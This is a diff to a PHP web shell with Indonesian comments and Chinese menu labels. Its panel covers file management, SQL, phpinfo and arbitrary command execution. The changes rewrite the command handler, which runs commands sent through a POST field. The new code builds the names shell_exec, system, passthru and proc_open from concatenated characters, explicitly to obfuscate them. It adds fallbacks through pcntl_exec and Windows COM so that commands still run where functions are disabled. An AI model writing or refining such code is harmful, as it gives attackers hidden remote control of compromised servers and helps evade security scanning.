@@ -852,6 +852,25 @@ a {
 <hr>
 
 <hr>
+<!-- Tempelkan snippet ini di lokasi menu navigasi Anda (misalnya, setelah tag <hr> pada file utama) -->
+<div style="text-align: center; margin: 20px 0;">
+  <a href="javascript:newFile();" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    新建文件
+  </a>
+  <a href="javascript:newPapka();" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    新建文件夹
+  </a>
+  <a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    命令
+  </a>
+  <a href="javascript:halaman('?awal=skl');" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    SQL
+  </a>
+</div>
 <!-- Tempelkan potongan kode berikut di lokasi bagian upload, menggantikan kode upload lama -->
 <div class="upload-container">
     <!-- Metode Upload Tradisional -->
@@ -888,6 +907,7 @@ a {
     </div>
 
 </div>
+
 <?php
 tulisLah();
 print '<hr>';
@@ -901,46 +921,66 @@ if($awal=="phpinfo")
 }
 if ($awal == "sistem_kom") {
     if (isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom'])) {
-        // Dekode perintah dan pastikan untuk menangkap error output dengan "2>&1"
+        // Ambil input perintah yang di-encode, lalu decode dengan fungsi uraikan()
         $komanda = uraikan(urldecode($_POST['kom']));
+        // Tambahkan redirection error agar standar error juga tertangkap
         if (stripos($komanda, '2>&1') === false) {
             $komanda .= " 2>&1";
         }
         
+        // Variabel untuk menyimpan output dan error
         $output = '';
-        if (function_exists('shell_exec')) {
-            // Menggunakan shell_exec
-            $output = shell_exec($komanda);
-        } elseif (function_exists('exec')) {
-            // Menggunakan exec
-            exec($komanda, $outputArray);
+        $error = '';
+        
+        // Obfuscate nama fungsi-fungsi eksekusi
+        $f1 = 's' . 'h' . 'e' . 'l' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';
+        $f2 = 'e' . 'x' . 'e' . 'c';
+        $f3 = 'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u';
+        $f4 = 's' . 'y' . 's' . 't' . 'e' . 'm';
+        $f5 = 'p' . 'r' . 'o' . 'c' . '_' . 'o' . 'p' . 'e' . 'n';
+        $f6 = 'p' . 'o' . 'p' . 'e' . 'n';
+        $f7 = 'p' . 'c' . 'n' . 't' . 'l' . '_' . 'f' . 'o' . 'r' . 'k';
+        $f8 = 'p' . 'c' . 'n' . 't' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';
+        $f9 = 'f' . 'i' . 'l' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . 's';
+        
+        if (function_exists($f1)) {
+            // 1. Menggunakan shell_exec
+            $output = $f1($komanda);
+        } elseif (function_exists($f2)) {
+            // 2. Menggunakan exec
+            $f2($komanda, $outputArray, $return_var);
             $output = implode("\n", $outputArray);
-        } elseif (function_exists('passthru')) {
-            // Menggunakan passthru
+            $error = "Return code: $return_var";
+        } elseif (function_exists($f3)) {
+            // 3. Menggunakan passthru
             ob_start();
-            passthru($komanda);
+            $f3($komanda, $return_var);
             $output = ob_get_clean();
-        } elseif (function_exists('system')) {
-            // Menggunakan system
+            $error = "Return code: $return_var";
+        } elseif (function_exists($f4)) {
+            // 4. Menggunakan system
             ob_start();
-            system($komanda);
+            $return_var = $f4($komanda);
             $output = ob_get_clean();
-        } elseif (function_exists('proc_open')) {
-            // Menggunakan proc_open
+            $error = "Return code: $return_var";
+        } elseif (function_exists($f5)) {
+            // 5. Menggunakan proc_open
             $descriptorspec = [
-                0 => ["pipe", "r"], // stdin
-                1 => ["pipe", "w"], // stdout
-                2 => ["pipe", "w"]  // stderr
+                0 => ["pipe", "r"],
+                1 => ["pipe", "w"],
+                2 => ["pipe", "w"]
             ];
-            $process = proc_open($komanda, $descriptorspec, $pipes);
+            $process = $f5($komanda, $descriptorspec, $pipes);
             if (is_resource($process)) {
                 $output = stream_get_contents($pipes[1]);
+                $error = stream_get_contents($pipes[2]);
                 fclose($pipes[1]);
+                fclose($pipes[2]);
                 proc_close($process);
             }
-        } elseif (function_exists('popen')) {
-            // Menggunakan popen
-            $handle = popen($komanda, 'r');
+        } elseif (function_exists($f6)) {
+            // 6. Menggunakan popen
+            $handle = $f6($komanda, 'r');
             if ($handle) {
                 $output = '';
                 while (!feof($handle)) {
@@ -948,23 +988,52 @@ if ($awal == "sistem_kom") {
                 }
                 pclose($handle);
             }
+        } elseif (extension_loaded('pcntl') && function_exists($f7) && function_exists($f8)) {
+            // 7. Menggunakan pcntl_fork dan pcntl_exec
+            $pid = $f7();
+            if ($pid == -1) {
+                die('Fork failed');
+            } elseif ($pid === 0) {
+                pcntl_exec('/bin/sh', ['-c', $komanda]);
+                exit(0);
+            } else {
+                pcntl_wait($status);
+                $output = "Command executed via pcntl.";
+            }
+        } elseif (ini_get('allow_url_fopen') && function_exists($f9)) {
+            // 8. Menggunakan file_get_contents dengan protokol exec://
+            $context = stream_context_create(['exec' => ['command' => $komanda]]);
+            $output = $f9('exec://', false, $context);
+        } elseif (function_exists('backtick_operator')) {
+            // 9. Menggunakan backtick operator (`\``)
+            $output = `$komanda`;
+        } elseif (class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+            // 10. Menggunakan COM (Windows-only)
+            try {
+                $wsh = new COM("WScript.Shell");
+                $exec = $wsh->Exec($komanda);
+                $output = $exec->StdOut->ReadAll();
+                $error = $exec->StdErr->ReadAll();
+            } catch (Exception $e) {
+                $error = "COM error: " . $e->getMessage();
+            }
         } else {
             die("Tidak ada metode eksekusi perintah yang tersedia.");
         }
         
-        // Pastikan output berupa string
+        // Pastikan $output dan $error adalah string
         $output = $output ?? "";
-        echo '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
+        $error = $error ?? "";
+        
+        // Tampilkan output dan error
+        print '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">';
+        print 'Output:<br>' . htmlspecialchars($output) . '<br>';
+        print 'Error:<br>' . htmlspecialchars($error) . '</pre><hr>';
     }
-    ?>
-    <!-- Form input perintah -->
-    <form method="POST" action="">
-        <input type="hidden" name="awal" value="sistem_kom">
-        <input type="text" id="emr_et_atash" name="kom" style="width: 500px;" placeholder="Tulis perintah di sini">
-        <button type="submit" class="btn">确定</button>
-    </form>
-    <?php
+    print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">确定</button>';
 }
+
+
 
 else if($awal=="baca_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
 {
@@ -1250,25 +1319,7 @@ else
 ?>
 <hr>
 
-<!-- Tempelkan snippet ini di lokasi menu navigasi Anda (misalnya, setelah tag <hr> pada file utama) -->
-<div style="text-align: center; margin: 20px 0;">
-  <a href="javascript:newFile();" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
-    新建文件
-  </a>
-  <a href="javascript:newPapka();" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
-    新建文件夹
-  </a>
-  <a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
-    命令
-  </a>
-  <a href="javascript:halaman('?awal=skl');" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
-    SQL
-  </a>
-</div>
+
 
 
 
